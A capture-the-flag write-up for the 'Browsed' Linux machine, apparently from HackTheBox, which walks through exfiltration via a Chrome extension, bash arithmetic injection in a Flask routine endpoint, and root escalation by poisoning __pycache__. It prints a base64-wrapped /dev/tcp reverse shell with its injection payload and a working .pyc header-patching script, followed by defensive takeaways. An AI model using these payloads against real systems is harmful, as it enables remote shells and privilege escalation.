Machine Overview

Browsed is a Medium-rated Linux machine that chains four distinct techniques: a malicious Chrome extension loaded server-side exfiltrates internal service data; source code recovered from an internal Gitea instance reveals a Flask endpoint vulnerable to bash arithmetic evaluation injection via [[ "$1" -eq 0 ]]; and finally a world-writable __pycache__ directory allows Python bytecode poisoning to hijack a sudo-privileged tool and escalate to root.

Open Ports 22 (SSH), 80 (nginx)
Internal :3000 Gitea 1.24.5, :5000 Flask Markdown Previewer
Chrome Version 134 (headless, loads uploaded extensions as www-data)
◈
Attack chain: Upload malicious Chrome extension → exfiltrate internal Gitea repo + Flask source → bash arithmetic injection via /routines/<rid> → shell as larry → world-writable __pycache__ poisoning → sudo trigger → root.

07
Source Code Analysis — Vulnerable Flask Endpoint
Phase 2.5 — app.py + routines.sh Review

The recovered source code reveals a critical vulnerability chain: the Flask /routines/<rid> endpoint passes its URL parameter directly to a bash script that performs arithmetic comparison with [[ "$1" -eq 0 ]] — triggering bash arithmetic evaluation on attacker-controlled input.

python — app.py (key excerpt)
@app.route('/routines/<rid>')
def routines(rid):
    subprocess.run(["./routines.sh", rid])  # NO shell=True — safe from shell injection
    return "Routine executed !"
bash — routines.sh (key excerpt)
#!/bin/bash
if [[ "$1" -eq 0 ]]; then   # ← arithmetic evaluation — VULNERABLE
  find "$TMP_DIR" -type f -name "*.tmp" -delete
elif [[ "$1" -eq 1 ]]; then
  tar -czf "$BACKUP_DIR/data_backup_$(date '+%Y%m%d_%H%M%S').tar.gz" "$DATA_DIR"
fi
✕
Bash Arithmetic Evaluation Injection: The -eq operator inside [[ ]] performs arithmetic evaluation. A payload like a[$(command)] causes bash to evaluate $(command) as an array subscript — executing the command. Although subprocess.run avoids shell expansion, the bash script re-evaluates input through arithmetic context.

User Shell — Bash Arithmetic Injection

08
Crafting the Slash-Free Payload
Phase 3.1 — Base64-Encoded Reverse Shell

Flask's default <rid> URL converter does not match slashes, so the payload must be slash-free. Base64-encoding the reverse shell command eliminates all forward slashes. The arithmetic injection wrapper a[$(...)] triggers command execution when bash evaluates the arithmetic expression.

bash
# Base64-encode the reverse shell (removes slashes)
echo -n 'bash -i >& /dev/tcp/10.10.14.76/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Ni80NDQ0IDA+JjE=
◈
Payload: a[$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Ni80NDQ0IDA+JjE=|base64 -d|bash)] — no slashes. echo, base64, and bash are all in $PATH.

Analyse Tool Permissions — World-Writable __pycache__
Phase 4.2 — Filesystem Permission Audit

Inspecting the /opt/extensiontool/ directory reveals a critical misconfiguration: the __pycache__ directory is world-writable (drwxrwxrwx). Python checks cached bytecode in __pycache__ before reading source — if the .pyc timestamp and source size match the original, it loads the cached bytecode without recompiling.

bash
ls -la /opt/extensiontool/
output
extension_tool.py      root:root  rwxrwxr-x
extension_utils.py     root:root  rw-rw-r--
__pycache__/           root:root  rwxrwxrwx  ← WORLD-WRITABLE
extensions/
✕
Security Issue: A world-writable __pycache__ directory allows any user to replace compiled Python bytecode. Since the sudo-privileged script imports extension_utils, poisoning the cached .pyc file causes root to execute attacker-controlled bytecode.

14
Compile & Patch .pyc Header
Phase 4.4 — Timestamp + Size Spoofing for Cache Trust

Python validates cached bytecode by checking the .pyc header's timestamp and source size against the original .py file. We compile the malicious module and patch the header fields to match the real extension_utils.py metadata, making Python trust and load the poisoned bytecode.

python — patch_pyc.py
import py_compile, struct, calendar, time

# Compile malicious module to .pyc
py_compile.compile('/tmp/extension_utils.py', '/tmp/extension_utils.cpython-312.pyc')

with open('/tmp/extension_utils.cpython-312.pyc', 'rb') as f:
    data = bytearray(f.read())

# Match original source: mtime = 2025-03-23 10:56:19 UTC, size = 1245 bytes
ts   = int(calendar.timegm(time.strptime('2025-03-23 10:56:19', '%Y-%m-%d %H:%M:%S')))
size = 1245

# .pyc header: magic(4) + flags(4) + timestamp(4) + source_size(4)
struct.pack_into('<I', data, 4,  0)     # flags = 0 (timestamp-based)
struct.pack_into('<I', data, 8,  ts)    # timestamp
struct.pack_into('<I', data, 12, size)  # source size

with open('/tmp/extension_utils.cpython-312.pyc', 'wb') as f:
    f.write(data)

Key Takeaways
01 //
Server-Side Extension Loading
Loading user-supplied Chrome extensions server-side grants the attacker the full Chrome extension API — including fetch to any internal service, cookie access, and tab enumeration. Never execute untrusted extensions in a privileged browser context.
02 //
Bash Arithmetic Evaluation Injection
The -eq operator in [[ ]] triggers arithmetic evaluation, executing $(command) in array subscripts. Use [ "$1" = "0" ] (string comparison) or validate inputs are strictly numeric before passing to arithmetic contexts.
03 //
subprocess.run Is Not Enough
Using subprocess.run(list) prevents shell injection at the Python level, but the invoked script itself can still evaluate its arguments in unsafe contexts. Defense-in-depth requires validating inputs in the script too.
04 //
World-Writable __pycache__
Python trusts __pycache__ bytecode over source when header metadata matches. A world-writable cache directory allows any user to inject malicious bytecode that executes when the module is next imported — including by privileged processes.
05 //
Internal Services via Extension Exfil
Unauthenticated Gitea repositories exposed on internal networks are a high-value target. Sensitive source code, credentials, and infrastructure details should never be stored in publicly accessible repos — even on "internal-only" services reachable from container contexts.
06 //
Slash-Free Payloads via Base64
URL routing constraints that block slashes can be bypassed by base64-encoding shell commands. This pattern works anywhere a command is evaluated (bash, Python's eval, etc.) and removes most character restrictions from injection payloads.
